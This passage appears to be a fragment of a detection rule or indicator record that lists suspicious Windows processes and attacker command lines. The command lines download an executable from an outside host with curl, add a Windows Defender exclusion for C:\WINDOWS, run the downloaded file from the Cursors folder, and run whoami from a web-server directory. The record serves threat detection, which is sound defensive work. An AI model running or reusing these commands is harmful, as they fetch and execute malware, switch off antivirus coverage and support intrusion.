  - httpd.exe
  - powershell.exe
  - live.exe
  - x.exe
  - SQLlite.exe
  - rundll32.exe
  - cmd.exe
  commandline:
  - '''curl -O https://rism.pages.dev/microsoft.exe-stag'''
  - '''Add-MpPreference -ExclusionPath ''C:\WINDOWS'''''
  - cmd.exe /c "powershell /c \"cd C:\\\\Windows\\\\Cursors\";.\\live.exe https://rism.pages.dev/microsoft.exe;echo
    8394e84;(pwd).path;echo a7ad42acaca"
  - powershell /c "curl -O live.exe https://rism.pages.dev/microsoft.exe"
  - cmd.exe /c "powershell /c \"cd C:/xamp/htdocs\";whoami;echo c706fe7013;(pwd).path;echo
    8acf72"
